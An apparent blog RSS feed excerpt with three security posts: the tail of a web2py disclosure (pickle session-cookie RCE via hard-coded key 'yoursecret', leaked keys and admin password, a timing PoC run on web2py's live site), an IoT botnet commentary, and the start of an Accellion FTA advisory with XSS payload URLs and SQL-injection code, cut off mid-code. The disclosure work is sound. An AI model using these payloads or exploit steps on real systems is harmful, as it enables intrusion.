        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Bingo!!!&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;因此，如果知道連線中用以加密 cookie 內容的 encryption_key，攻擊者就可以偽造 session cookie，進而利用 pickle.loads 進行遠端命令執行。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3953&quot;&gt;CVE-2016-3953&lt;/h4&gt;

&lt;p&gt;很幸運的，我們發現 web2py 預設開啟的範例應用程式是使用 session cookie，並且有一個寫死的密鑰：&lt;code class=&quot;highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;。[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/applications/examples/models/session.py&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;yoursecret&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;因此，web2py 的使用者如果沒有手動關閉範例應用程式，攻擊者就可以直接在 http://[target]/examples/ 頁面發動攻擊取得主機操作權。&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h4&gt;

&lt;p&gt;我們嘗試用 &lt;code class=&quot;highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt; 作為 encryption_key 偽造一個合法的 session cookie，並將一個會執行系統指令 sleep 的物件塞入其中。帶著此 session cookie 連入 web2py 官網範例應用程式(http://www.web2py.com/examples)，情形如下：&lt;/p&gt;

&lt;p&gt;當插入的物件會執行指令 sleep 3 時，網站回應時間為 6.8 秒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC1.png&quot; alt=&quot;POC1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;當插入的物件會執行指令 sleep 5 時，網站回應時間為 10.8 秒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC2.png&quot; alt=&quot;POC2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;確實會因為塞入的 session cookie 值不同而有所延遲，證明網站的確執行了（兩次）我們偽造的物件內容。&lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;h3 id=&quot;其他洩漏導致-rce&quot;&gt;其他洩漏導致 RCE&lt;/h3&gt;

&lt;p&gt;此外，在 web2py 範例應用程式為了示範框架的特性，因此洩漏了許多環境變數。其中有兩個變數較為敏感，間接也會導致端命令執行，分別如下。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3954&quot;&gt;CVE-2016-3954&lt;/h4&gt;

&lt;p&gt;在 http://[target]/examples/simple_examples/status 頁面中，response 分頁內容洩漏了 session_cookie_key 值。這個值就是用來加密前面所介紹的 session cookie，搭配 CVE-2016-3957 Pickle 的問題可直接遠端命令執行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3954.png&quot; alt=&quot;CVE-2016-3954&quot; /&gt;&lt;/p&gt;

&lt;p&gt;無論使用者是否自行更改 session_cookie_key，或是該值是系統隨機產生。此介面仍然可以取得機敏資訊藉以造成危害。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3952&quot;&gt;CVE-2016-3952&lt;/h4&gt;

&lt;p&gt;http://[target]/examples/template_examples/beautify 頁面洩漏了系統環境變數，當使用者是使用 standalone 版本時，管理者的密碼就會在環境變數裡出現。這個密碼可登入 http://[target]/admin 管理介面，管理介面內提供方便的功能得以執行任意指令。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3952.png&quot; alt=&quot;CVE-2016-3952&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;官方修復&quot;&gt;官方修復&lt;/h3&gt;

&lt;p&gt;Version 2.14.1 移除洩漏的環境變數。[&lt;a href=&quot;https://github.com/web2py/web2py/commit/9706d125b42481178d2b423de245f5d2faadbf40&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;Version 2.14.2 使用不固定字串作為 session_cookie_key，並移除洩漏頁面。&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;cookie_key&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;總結&quot;&gt;總結&lt;/h3&gt;

&lt;p&gt;web2py 框架預設會開啟一個範例應用程式，路徑為 http://[target]/examples/。&lt;br /&gt;&lt;br /&gt;
由於這個應用程式使用 Pickle 來處理序列化的 session cookie，且因為加密字串為寫死的 &lt;code class=&quot;highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;，任何人可竄改 session cookie 的內容，藉此進行 Pickle 命令執行攻擊。&lt;br /&gt;&lt;br /&gt;
該範例程式介面中也存在 session_cookie_key、管理者密碼洩漏問題，兩個都會導致任意命令執行。除此之外，在這個應用程式中洩漏許多系統配置、路徑等資訊，有機會被拿來做進階攻擊。&lt;br /&gt;&lt;br /&gt;
在 2.14.2 版本後已經修復所有洩漏問題，當然最好的解決辦法就是關閉這個範例應用程式。&lt;/p&gt;

&lt;p&gt;最後，來整理從開發者的角度在這個案例中該注意的要點：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;小心處理序列化字串，使用者若有機會改變該字串值，有機會被插入未預期的惡意物件，造成惡意的結果。&lt;/li&gt;
  &lt;li&gt;正式產品中切記要移除任何跟開發相關的配置。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;時間軸&quot;&gt;時間軸&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/03/08 發現問題與其他研究&lt;/li&gt;
  &lt;li&gt;2016/03/09 回報官方 &lt;a href=&quot;https://github.com/web2py/web2py/issues/1205&quot;&gt;GitHub Issue&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2016/03/15 成功與開發者 email 聯繫&lt;/li&gt;
  &lt;li&gt;2016/03/15 官方修復管理者密碼洩漏問題 (CVE-2016-3952)&lt;/li&gt;
  &lt;li&gt;2016/03/25 官方修復其他弱點並發佈 2.14.2 版本&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;其實 CVE-2016-3957 並非不安全的設計，在跟 CVE team 溝通的過程中發現 web2py 開始使用 JSON 取代 Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]，因此判定 web2py 認為目前的設計是不洽當的，給予此編號。後來官方因故將 Pickle 改了回來，不過在沒有洩漏加密字串的前提下已經是安全的了。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;在自行架設的 web2py 環境中只會執行一次，沒有去細追 web2py 官方網站為何執行兩次。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</link>
                <guid>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957</guid>
                <pubDate>Tue, 03 Jan 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>IoT設備商別成為幫兇 從Dyn DDoS攻擊事件看IoT安全</title>
                <description>&lt;h3 id=&quot;萬物皆聯網成為萬物皆可駭&quot;&gt;萬物皆聯網成為萬物皆可駭&lt;/h3&gt;

&lt;p&gt;2016年10月21日知名網路服務 Dyn 遭受殭屍網路發動三波巨大規模 DDoS 攻擊，世界各大網站服務皆因為此攻擊而中斷，包括 Amazon、Twitter、Github、PayPal 等大型網站都因此受到影響。資安人員研究發現，本次 DDoS 攻擊的發起者未明，但多數攻擊流量來自殭屍網路「Mirai」，利用 IPCAM、CCTV、DVR、IoT 裝置等系統進行 DDoS 攻擊。為什麼這些設備會成為攻擊的幫凶呢？我們又該如何自保呢？&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;一個攻擊事件，一定有背後的原因。攻擊者一定是有所求，才會進行攻擊，可能是求名、求利或求樂趣。因為 DDoS 攻擊會直接影響目標系統的運作，對系統營運造成影響，在黑色產業的循環中通常會利用這種攻擊來勒索錢財。例如針對營運線上遊戲的公司進行 DDoS 攻擊，讓遊戲服務中斷，逼迫企業將主機的連線花錢「贖」回來。但 Dyn 這次的事件各家都沒有收到類似的勒索信，因此資安專家們推測，這可能是一次練兵，或者甚至是 DDoS 攻擊服務的行銷手法。如果我們用黑色產業的角度去思考一個攻擊行為，就會有截然不同的看法。試想，如果這是一次駭客組織的商業行銷行為，目的是展現這個團隊的 DDoS 攻擊火力，這樣的成果是否可以稱作是一個成功案例呢？如果你是服務購買者，是否對這樣的服務有信心呢？&lt;/p&gt;

&lt;p&gt;利用 IoT 裝置及網通設備佈建殭屍網路 (botnet) 已經不是新聞。Internet Census 2012 是一次資安圈的大事件，一個稱為 Carna 的 botnet 利用了全世界 42 萬台裝置，掃描全世界整個 IPv4 設備，蒐集 IP 使用狀況、連接埠、服務標頭等資訊，並且提供共計 9TB 資料開放下載研究。而這個 botnet 多數利用路由器 (router) 的漏洞，利用預設密碼、空密碼登入設備，植入後門供攻擊者控制。而後的幾次大型攻擊事件都與 IoT 及嵌入式裝置有關係，讓 IoT 的口號「萬物皆聯網」成為「萬物皆可駭」，也讓資安研究人員對於研究這類型設備趨之若鶩。近年智慧車輛不斷發展，國際間也不少智慧車輛被駭的事件。車輛被駭影響的就不單是資訊系統，更會波及人身安全甚至整個城市的交通，資安考量的影響也遠比以前嚴重。&lt;/p&gt;

&lt;h3 id=&quot;連網裝置成為駭客下手的主要原因&quot;&gt;連網裝置成為駭客下手的主要原因&lt;/h3&gt;

&lt;p&gt;究竟是怎樣的安全漏洞讓攻擊者這麼輕易利用呢？目前攻擊者及 botnet 多數利用的還是使用預設密碼、或甚至是沒有設定密碼的裝置。網站 &lt;a href=&quot;https://www.insecam.org&quot;&gt;Insecam&lt;/a&gt; 揭露了全世界數萬支未修改密碼的攝影機，再再顯示不少民眾或公司行號購買了監視器，卻沒有健全的資安意識，讓監視器暴露於全世界之中。更多攝影機、監視器等的資安議題可以參考我們的文章&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;「網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？」&lt;/a&gt;。除了預設密碼之外，設備中的後門也是一個大問題。不少路由器、無線基地台廠商被爆出系統中含有測試用的登入帳號，該帳號無法關閉、無法移除，且容易被攻擊者進行研究取得。除了等待廠商升級韌體來修補該問題之外，沒有其他解法，因此成為攻擊者大量取得控制權的方式之一。&lt;/p&gt;

&lt;p&gt;IoT 裝置為什麼會成為攻擊者下手的目標呢？我們可以分成幾點來探討。&lt;/p&gt;

&lt;p&gt;第一，嵌入式裝置以往的設計都是不連網，IoT 的風潮興起之後，各廠商也為了搶市場先機，加速推出產品，將原本的產品加上網路功能，甚至 App 控制功能。而求快的結果就是犧牲資安考量，加上廠商可能原本並非網路專長，也沒有足夠的資安人員檢視安全性，導致設計出來的產品資安漏洞層出不窮。產品的設計必須嚴守 Security by Design 的原則，在開發初期的每個環節都納入資安考量，並且遵守 Secure Coding 規範，避免在產品後期疊床架屋，造成要釐清資安問題的根源更難如登天。&lt;/p&gt;

&lt;p&gt;第二，產品的更新機制問題。IoT 裝置的更新機制在早期並沒有謹慎考量，需要使用者自行下載韌體更新，甚至有些裝置必須回廠才能進行更新。不少使用者只要產品沒有出問題，並不會主動進行韌體更新，甚至覺得更新只會造成更多問題。在沒有便利更新機制的情況之下，設備的資安問題更難以被妥善處理。近期因為資安事件頻傳，FOTA (Firmware Over-The-Air) 機制才逐漸被重視，但其他資安問題也隨即而來。如何確保韌體的完整性？如何防止攻擊者下載韌體進行研究修改？這些都是廠商需要不斷去反覆思量的。&lt;/p&gt;

&lt;p&gt;第三，敵暗我明，也是我們認為最重要的一點。我們認為資安就是攻擊者與防禦者的一場資訊不對稱戰爭，防禦者（廠商）通常只會憑藉著自己的知識跟想像進行防禦，但卻不知道攻擊者的思維跟手法。就像春秋時代公輸般，建造雲梯協助楚國攻擊宋國的城池。唯有了解攻擊者，化解這個不對稱的資訊，才能有效的進行防禦，如同墨子了解雲梯的攻擊方式，模擬各種對應防禦的手法，才成功讓楚王放棄攻擊。不僅是 IoT 廠商，所有企業都必須了解攻擊者的思維、手法，知曉這個黑色產業的運作，甚至針對攻擊的方式進行模擬演練，將每一個防禦的缺口補足，才可以正面迎戰攻擊者。&lt;/p&gt;

&lt;h3 id=&quot;設備商避免成為幫凶消費者也應自保&quot;&gt;設備商避免成為幫凶，消費者也應自保&lt;/h3&gt;

&lt;p&gt;身為使用者，我們該如何確認自己的設備有沒有被感染呢？若被感染該怎麼有效清除呢？建議先搜尋網路上目前已公開有漏洞的廠牌及型號，若在問題清單之內，先將整台設備備份設定後，回復原廠初始設定，以確保攻擊者放置的惡意程式都被清除。接著更新廠商所釋出的新版韌體，並記得在更新安裝完畢後立即更換密碼以防二度被入侵。若廠商無釋出更新，可能是資安不被重視，也可能是廠商已經結束營運。如果還是選擇要使用這個設備，建議將設備轉放在內部網路，或者是在前面增加防禦設備，避免攻擊者入侵。&lt;/p&gt;

&lt;p&gt;至於廠商該怎麼跟上資安的腳步呢？我們認為目前廠商最重要的就是資安意識。這已經是老生常談，以往網路產業逐漸重視資安，但跨入網路的其他資訊產業恐怕還沒意識到資安的嚴重性。凡舉傳統家電轉為智慧家電、車輛轉為智慧車輛、甚至基礎建設也逐漸資訊化的現在，若這些踏入網路的產業沒有相對應的資安意識，恐怕很難在初期就預防風險的發生。企業也必須盤點風險的所在，透過人工滲透測試模擬攻擊者的攻擊思維及路徑，如同軍事演習一般，將入侵的途徑一一封鎖。我們認為 IoT 等嵌入式裝置、智慧家電、甚至網通資安設備本身，未來都會是駭客組織攻擊的對象，利用更新的困難度跟管理者的疏於管理，建置一個個大規模殭屍大軍，成為未來戰爭的棋子。我們期許未來廠商建構產品時，都能優先納入資安考量，不成為黑色產業的幫凶，也讓國際認可台灣產品是資安至上的優良品質。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/</link>
                <guid>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks</guid>
                <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;  &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;about-accellion-fta&quot;&gt;About Accellion FTA&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Accellion File Transfer Appliance (&lt;code class=&quot;highlighter-rouge&quot;&gt;FTA&lt;/code&gt;) is a secure file transfer service which enables users to share and sync files online with AES 128/256 encryption. The Enterprise version further incorporates SSL VPN services with integration of Single Sign-on mechanisms like AD, LDAP and Kerberos.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
In this research, the following vulnerabilities were discovered on the FTA version FTA_9_12_0 (13-Oct-2015 Release)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above-mentioned vulnerabilities allow unauthenticated attackers to remotely attack FTA servers and gain highest privileges successfully. After the attackers fully controlled the servers, they will be able to retrieve the encrypted files and user data, etc.&lt;/p&gt;

&lt;p&gt;After reporting to CERT/CC, these vulnerabilities were assigned 4 CVEs (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353).  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;areas-affected&quot;&gt;Areas Affected&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore.  &lt;br /&gt;
Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;vulnerability-analysis-and-exploitation&quot;&gt;Vulnerability Analysis and Exploitation&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;&lt;br /&gt;
?f2=’-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;&lt;br /&gt;
?documentname=”onerror=”prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;&lt;br /&gt;
?msg=ssologout&lt;br /&gt;&lt;br /&gt;
&amp;amp;loginurl=”&amp;gt;&amp;lt;svg/onload=”prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.  &lt;br /&gt;
The key to this problem lies in the &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; function called by security_key2.api!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Among these parameters, &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;$password&lt;/code&gt; are controllable by the attackers. And although the function &lt;code class=&quot;highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; handles the passwords, it does not involve in the triggering of the vulnerability.  &lt;br /&gt;
One thing to pay special attention is that the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; will be treated as a global variable which represents the current Application ID in use, and will be applied in &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; accordingly. The code in &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; includes the following lines:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt;, the name of the database to be opened is controllable by the user. If wrong value was given, the program will be interrupted. Therefore, &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; must be forged correctly.&lt;/p&gt;

&lt;p&gt;The following lines are the most important function &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span 